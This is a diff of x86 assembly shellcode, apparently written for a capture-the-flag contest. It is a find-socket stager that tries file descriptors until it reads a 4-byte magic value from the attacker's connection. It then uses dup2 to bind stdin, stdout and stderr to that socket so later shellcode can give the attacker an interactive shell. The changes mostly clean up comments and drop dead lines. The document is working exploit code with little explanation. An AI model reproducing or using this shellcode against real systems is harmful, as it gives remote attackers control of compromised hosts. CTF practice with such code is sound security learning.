@@ -12,8 +12,7 @@ global main
 
 main:
 	mov ecx,esp 		; TODO is this too early?
-	;;mov ecx, dword 0xbfffff4c
-	xor cx,cx 		; esi=some valid stack address
+	xor cx,cx 		; ecx=some valid stack address
 
 	xor ebx,ebx
 	mov bl,20		;adjust for the popularity of the ctf
@@ -28,32 +27,25 @@ ourread:
 .next:
 	; sets up read
 	xor eax,eax
-	mov al, 3 		;eax
-
-	;lea esi,[rel main] 	;since we expect to be W&X we can resue main
-	                        ;for storage 
-				; TODO get storage via the 
-				; mov eax esp/ xor ax, ax
-	
-
-	int 0x80		        ;read eax=3
-	;syscall no work 
-	;sysenter
+	mov al, 3 		;eax	
+	int 0x80		;read eax=3
 	cmp al,4  		;check to see if we've received our 4 bytes
 	jnz ourread  		;if not, try with another file descriptor
+	;;TODO: lets get rid of this cmp al,4 nonsense and save some bytes.
 	cmp [ecx], MAGIC ;this is our magic number %defined on top
 	jnz ourread      ; if we don't match try another file descriptor
 
+	
 	;; this dup2 code attaches stdin stdout and stderr to our socket
 	;; so that we can talk to whatever program we run later
 dup2: 	
 	xor ecx,ecx 
 	mov cl, 2
 .copy:
-	xor eax,eax 	; because we want to nuke the retval of dup2
-	mov al,63		;dup2
+	xor eax,eax 	; because we need to nuke the retval of dup2
+	mov al,63	;dup2
 	int 0x80
-	dec ecx    ; this is for looping stderr/out/in
+	dec ecx    	; this is for looping stderr/out/in
 	jns dup2.copy
 
 	;; now just some local shellcode
